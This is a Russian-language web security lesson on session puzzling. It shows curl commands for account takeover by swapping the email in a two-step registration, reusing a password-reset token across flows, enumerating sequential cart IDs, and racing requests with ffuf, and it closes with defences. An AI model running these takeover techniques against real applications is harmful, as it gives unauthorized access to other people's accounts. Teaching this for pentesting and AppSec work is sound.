## Вопрос, с которого всё начинается

Ты изучаешь приложение, и код выглядит нормально: логин проверяет пароль, админ-панель проверяет роль, регистрация проверяет email. Но что если **разные части приложения используют одну и ту же переменную сессии** для разных целей?

Тогда можно записать в неё значение одним флоу, а прочитать — другим. Это **session puzzling** (путаница состояний сессии). В отличие от фиксации сессии, проблема тут не в навязанном идентификаторе, а в том, что **данные внутри сессии переиспользуются непредсказуемо**. Сегодня на одном примере покажем, как это приводит к захвату чужого аккаунта.

## Наш пример: флоу регистрации

Возьмём приложение `t` с регистрацией в два шага: на первом вводится email, на втором — пароль. Первый шаг:

```bash
$ curl -s -c jar -X POST https://t/register/step1 -d 'email=attacker@x.com'
{"step":"password","pending":"attacker@x.com"}
```

Сервер запомнил email в сессии (в поле `pending`) и ждёт пароль. Второй шаг:

```bash
$ curl -s -b jar -X POST https://t/register/step2 -d 'password=Pwn1!'
{"ok":true,"user":"attacker@x.com"}
```

Пока всё логично. Проблема проявится, когда мы посмотрим, что ещё пишется и читается в той же сессии.

## Шаг 1: карта флоу — какие ключи живут в сессии

Прежде чем ломать, надо понять, какие ключи сессии пишутся и читаются на каждом шаге. Прослеживаем cookie по флоу:

```bash
$ for url in /register/step1 /register/step2 /login /forgot; do
>   echo "== $url"; curl -s -i -c jar -b jar -X POST "https://t$url" -d 'x=1' | grep -i set-cookie; done
== /register/step1
Set-Cookie: sess=AAAA1111; Path=/
```

Ключевой вопрос: не пишет ли **один и тот же ключ** сессии больше одного флоу? Например, `pending` при регистрации и `reset_user` при сбросе пароля — а читаются они одним и тем же кодом.

## Шаг 2: незавершённая регистрация

Классический сценарий. Шаг 1 создаёт в сессии `pending` с email. А что если на шаге 2 можно **подменить** этот email? Проверим, доверяет ли шаг 2 тому, что лежит в сессии, или принимает email из запроса:

```bash
$ curl -s -b 'sess=AAAA1111' -X POST https://t/register/step2 \
>   -d 'email=victim@corp.com&password=Pwn1!'
{"ok":true,"user":"victim@corp.com"}
```

Шаг 2 принял email из **тела запроса** и создал аккаунт жертвы с нашим паролем. Теперь логинимся:

```bash
$ curl -s -c j2 -X POST https://t/login -d 'email=victim@corp.com&password=Pwn1!'
$ curl -s -b j2 https://t/me | grep email
victim@corp.com
```

Мы вошли в аккаунт с email жертвы. Артефакт — доступ к чужому аккаунту. Корень проблемы: состояние «начатая регистрация» не привязано жёстко к конкретному email, и его можно переопределить на шаге 2.

## Шаг 3: переиспользование токена между флоу

Вторая грань puzzling — один токен используется в двух разных действиях. Запросим сброс пароля и получим токен в сессии, а затем попробуем применить его для подтверждения email:

```bash
$ curl -s -c jar -X POST https://t/forgot -d 'email=me@x.com'
# сервер положил sess[reset_token]=R1
$ curl -s -b jar -X POST https://t/confirm-email -d 'token=R1'
{"ok":true}
```

Токен, выданный для сброса пароля, принят в чужом флоу. Если приложение не помечает токены «назначением» (для чего они выданы), их можно переиспользовать, обходя проверки.

## Шаг 4: серверные объекты по предсказуемому ID

Иногда сессия ссылается на серверный объект (корзину, черновик), созданный с последовательным ID. Создаём свой и пробуем соседний:

```bash
$ curl -s -b jar -X POST https://t/cart -d 'item=1'    # -> {"cart_id":1001}
$ curl -s -b jar "https://t/cart/1002"
{"cart_id":1002,"items":["secret-item"]}    # чужая корзина
```

Это уже граничит с IDOR, но механизм тот же: состояние переиспользуется между запросами без привязки к владельцу.

## Шаг 5: гонки в состоянии

Если сессия обновляется асинхронно (например, при OAuth-редиректе), можно успеть вставить своё значение между шагами. Это смежная область с **race conditions**: два параллельных запроса меняют одно состояние, и проверка «проскакивает». Проверяют параллельными запросами с одинаковым телом:

```bash
$ ffuf -w /dev/stdin -u 'https://t/step2' -b 'sess=AAAA1111' -X POST \
>   -d 'email=victim@corp.com&password=Pwn1!' -mc all -fc 404
```

## Чем puzzling отличается от fixation

Их часто путают, но механика и защита разные.

**Session fixation** — атакующий навязывает жертве **известный ему идентификатор** сессии до логина, и после аутентификации приложение «поднимает» эту сессию. Защита — смена ID при логине (`session_regenerate_id`).

**Session puzzling** — идентификатор может быть вполне легитимным, но **данные внутри него переиспользуются** между флоу. Защита — разделять состояния (отдельные ключи), очищать временные данные после использования и не доверять тому, что записано до аутентификации.

Проверяй оба: сначала — меняется ли ID при логине, затем — не пересекаются ли ключи между флоу.

## Если не сработало

- Шаг 2 не принимает email из тела — попробуй подменить его через cookie или другой параметр, а также начать флоу A и завершить флоу B.
- Токен помечен назначением — поищи токены **без** такой пометки или предсказуемые (короткие, последовательные).
- ID серверного объекта — UUID — проверь, не утекает ли он в других ответах.
- Гонка не воспроизводится одним запросом — используй параллельные (Turbo Intruder) с точной синхронизацией.

## Что мы теперь знаем

- Session puzzling — переиспользование одной переменной/объекта сессии разными флоу.
- Искать нужно **пересечения** ключей: один ключ пишется в одном флоу, читается в другом.
- Незавершённая регистрация с подменой email ведёт к захвату аккаунта.
- Токены без пометки назначения можно применять в чужом флоу.
- Предсказуемые серверные ID и гонки — смежные векторы.
- Защита — дисциплина ключей и очистка временных данных, а не ротация ID.

## На что смотреть дальше

- Построй карту флоу: для каждого шага — какие ключи сессии пишутся и читаются.
- Ищи ключи, которые используются более чем в одном флоу, и ключи, записанные до аутентификации.
- Экспериментируй с **порядком**: начинай один флоу, завершай другим.
- Проверяй предсказуемость серверных ID и CSRF-токенов.
- Доводи до артефакта — доступ к чужому аккаунту или объекту, а не «странное поведение».
- Оценивай находку по последствиям: захват аккаунта — критично, обход MFA — высоко, чужой объект — средне.
- В отчёте опиши **точный порядок шагов**, чтобы PoC воспроизводился без догадок.
- Веди журнал флоу: для каждого шага фиксируй, какие cookie и серверные объекты появляются — так «магия» превращается в схему.

## Куда дальше

В следующем уроке мы перейдём к браузеру и разберём его безопасность — **`web-browser-security`**: sandbox, SOP, mixed content и другие механизмы, которые нас защищают. А пока главное запомни: session puzzling опасен тем, что не выглядит уязвимостью — код «работает», но переиспользование состояния даёт атакующему лишние возможности.

## Где пригодится

- **CTF (Web):** задачи на неочевидную логику сессий.
- **Bug bounty:** эскалация привилегий через состояние — редкий, но ценный баг.
- **Пентест:** аудит серверных сессий и флоу аутентификации.
- **Работа (AppSec):** изоляция пространств имён, сброс сессии при logout, очистка временных данных.
